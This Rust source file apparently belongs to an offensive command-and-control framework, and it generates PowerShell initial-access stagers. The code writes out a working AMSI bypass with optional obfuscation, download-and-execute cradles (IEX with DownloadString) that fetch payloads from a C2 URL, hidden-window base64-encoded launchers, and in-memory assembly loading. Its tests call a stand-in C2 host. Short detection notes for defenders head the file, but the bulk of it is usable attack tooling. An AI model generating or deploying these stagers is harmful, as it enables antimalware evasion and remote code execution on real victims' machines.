//! PowerShell stager generation.
//!
//! Generates download cradles, AMSI bypasses, and encoded launchers for
//! initial access delivery. Supports multiple execution methods and
//! optional obfuscation of cmdlet names and string literals.
//!
//! ## Detection (Blue Team)
//! - Event 4104 (ScriptBlock Logging): download/reflection patterns
//! - Event 4103 (Module Logging): .NET assembly loading from PowerShell
//! - YARA: `amsiInitFailed`, `DownloadString`, `[Reflection.Assembly]::Load`
//! - Sigma: PowerShell with `-enc` flag and hidden window style

use crate::BuilderError;
use serde::{Deserialize, Serialize};

/// Configuration for PowerShell stager generation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PowerShellConfig {
    /// URL the cradle will fetch the payload from.
    pub url: String,
    /// Include an AMSI bypass prefix.
    pub amsi_bypass: bool,
    /// Obfuscate cmdlet names and strings via concatenation/ticks.
    pub obfuscate: bool,
    /// Output format.
    pub output_format: PsFormat,
}

impl Default for PowerShellConfig {
    fn default() -> Self {
        Self {
            url: "https://example.com/payload".into(),
            amsi_bypass: false,
            obfuscate: false,
            output_format: PsFormat::OneLiner,
        }
    }
}

/// PowerShell output format.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum PsFormat {
    /// Single-line download cradle.
    OneLiner,
    /// Base64-encoded UTF-16LE command (`powershell -enc ...`).
    EncodedCommand,
    /// Multi-line script with comments.
    Script,
}

/// Generate a PowerShell stager string.
pub fn generate_powershell(config: &PowerShellConfig) -> Result<String, BuilderError> {
    let mut parts: Vec<String> = Vec::new();

    // 1. Optional AMSI bypass
    if config.amsi_bypass {
        parts.push(generate_amsi_bypass(config.obfuscate));
    }

    // 2. Download cradle
    parts.push(generate_download_cradle(&config.url, config.obfuscate));

    let script = parts.join(";");

    // 3. Format output
    match config.output_format {
        PsFormat::OneLiner => Ok(script),
        PsFormat::EncodedCommand => {
            let encoded = base64_encode_utf16le(&script);
            Ok(format!("powershell -nop -w hidden -enc {}", encoded))
        }
        PsFormat::Script => Ok(format!(
            "# Kraken C2 Stager\n\
             # MITRE ATT&CK: T1059.001 (PowerShell), T1105 (Ingress Tool Transfer)\n\
             #\n\
             # Detection: ScriptBlock Logging (Event 4104), Module Logging (Event 4103)\n\n\
             {}",
            script.replace(';', "\n")
        )),
    }
}

/// Generate an AMSI bypass via reflection (sets `amsiInitFailed = true`).
fn generate_amsi_bypass(obfuscate: bool) -> String {
    if obfuscate {
        // String concatenation to break static signatures.
        r#"$a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils');$f=$a.GetField('am'+'siInitFailed','NonPublic,Static');$f.SetValue($null,$true)"#.to_string()
    } else {
        r#"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"#.to_string()
    }
}

/// Generate a download-and-execute cradle using `Net.WebClient`.
fn generate_download_cradle(url: &str, obfuscate: bool) -> String {
    if obfuscate {
        format!(
            "$c=New-Object Net.WebClient;$c.Proxy=[Net.WebRequest]::DefaultWebProxy;\
             $c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;\
             IEX($c.DownloadString('{}'))",
            url
        )
    } else {
        format!("IEX(IWR -Uri '{}' -UseBasicParsing)", url)
    }
}

/// Base64-encode a PowerShell string as UTF-16LE for `-enc` usage.
pub fn base64_encode_utf16le(input: &str) -> String {
    use base64::Engine;
    let utf16: Vec<u8> = input
        .encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();
    base64::engine::general_purpose::STANDARD.encode(&utf16)
}

/// Decode a base64 UTF-16LE string back to UTF-8 (for testing).
pub fn base64_decode_utf16le(encoded: &str) -> Result<String, BuilderError> {
    use base64::Engine;
    let bytes = base64::engine::general_purpose::STANDARD
        .decode(encoded)
        .map_err(|e| BuilderError::Encoding(e.to_string()))?;

    if bytes.len() % 2 != 0 {
        return Err(BuilderError::Encoding(
            "decoded bytes not aligned to UTF-16".into(),
        ));
    }

    let utf16: Vec<u16> = bytes
        .chunks_exact(2)
        .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
        .collect();

    String::from_utf16(&utf16).map_err(|e| BuilderError::Encoding(e.to_string()))
}

/// Generate a base64-encoded inline payload launcher (no download needed).
pub fn generate_inline_payload(payload_bytes: &[u8], obfuscate: bool) -> String {
    use base64::Engine;
    let b64 = base64::engine::general_purpose::STANDARD.encode(payload_bytes);

    if obfuscate {
        format!(
            "$b=[Convert]::FromBase64String('{}');\
             $a=[Reflection.Assembly]::Load($b);\
             $a.EntryPoint.Invoke($null,@(,[string[]]@()))",
            b64,
        )
    } else {
        format!(
            "[Reflection.Assembly]::Load([Convert]::FromBase64String('{}')).EntryPoint.Invoke($null,@(,[string[]]@()))",
            b64,
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_oneliner() {
        let config = PowerShellConfig {
            url: "https://c2.example.com/stager".into(),
            amsi_bypass: false,
            obfuscate: false,
            output_format: PsFormat::OneLiner,
        };
        let result = generate_powershell(&config).unwrap();
        assert!(result.contains("c2.example.com"));
        assert!(result.contains("IEX"));
    }

    #[test]
    fn test_generate_with_amsi() {
        let config = PowerShellConfig {
            url: "https://c2.example.com/stager".into(),
            amsi_bypass: true,
            obfuscate: false,
            output_format: PsFormat::OneLiner,
        };
        let result = generate_powershell(&config).unwrap();
        assert!(result.contains("amsiInitFailed"));
    }

    #[test]
    fn test_generate_obfuscated_amsi() {
        let config = PowerShellConfig {
            url: "https://c2.example.com/stager".into(),
            amsi_bypass: true,
            obfuscate: true,
            output_format: PsFormat::OneLiner,
        };
        let result = generate_powershell(&config).unwrap();
        // Obfuscated version uses string concatenation.
        assert!(result.contains("Am'+'siUtils"));
    }

    #[test]
    fn test_encoded_command_format() {
        let config = PowerShellConfig {
            url: "https://c2.example.com/s".into(),
            amsi_bypass: false,
            obfuscate: false,
            output_format: PsFormat::EncodedCommand,
        };
        let result = generate_powershell(&config).unwrap();
        assert!(result.starts_with("powershell -nop -w hidden -enc "));
    }

    #[test]
    fn test_encoded_command_roundtrip() {
        let config = PowerShellConfig {
            url: "https://c2.example.com/test".into(),
            amsi_bypass: false,
            obfuscate: false,
            output_format: PsFormat::EncodedCommand,
        };
        let result = generate_powershell(&config).unwrap();
        let encoded_part = result.strip_prefix("powershell -nop -w hidden -enc ").unwrap();
        let decoded = base64_decode_utf16le(encoded_part).unwrap();
        assert!(decoded.contains("c2.example.com/test"));
    }

    #[test]
    fn test_script_format_has_comments() {
        let config = PowerShellConfig {
            url: "https://c2.example.com/s".into(),
            amsi_bypass: false,
            obfuscate: false,
            output_format: PsFormat::Script,
        };
        let result = generate_powershell(&config).unwrap();
        assert!(result.contains("# Kraken C2 Stager"));
        assert!(result.contains("T1059.001"));
    }

    #[test]
    fn test_obfuscated_cradle_uses_proxy() {
        let config = PowerShellConfig {
            url: "https://c2.example.com/s".into(),
            amsi_bypass: false,
            obfuscate: true,
            output_format: PsFormat::OneLiner,
        };
        let result = generate_powershell(&config).unwrap();
        assert!(result.contains("DefaultWebProxy"));
        assert!(result.contains("DefaultCredentials"));
    }

    #[test]
    fn test_inline_payload_basic() {
        let payload = b"test payload bytes";
        let result = generate_inline_payload(payload, false);
        assert!(result.contains("FromBase64String"));
        assert!(result.contains("EntryPoint.Invoke"));
    }

    #[test]
    fn test_inline_payload_obfuscated() {
        let payload = b"test payload";
        let result = generate_inline_payload(payload, true);
        assert!(result.contains("$b="));
        assert!(result.contains("$a="));
    }

    #[test]
    fn test_base64_utf16le_roundtrip() {
        let input = "Hello, PowerShell! Special chars: <>&|\"";
        let encoded = base64_encode_utf16le(input);
        let decoded = base64_decode_utf16le(&encoded).unwrap();
        assert_eq!(decoded, input);
    }

    #[test]
    fn test_base64_empty() {
        let encoded = base64_encode_utf16le("");
        let decoded = base64_decode_utf16le(&encoded).unwrap();
        assert_eq!(decoded, "");
    }
}
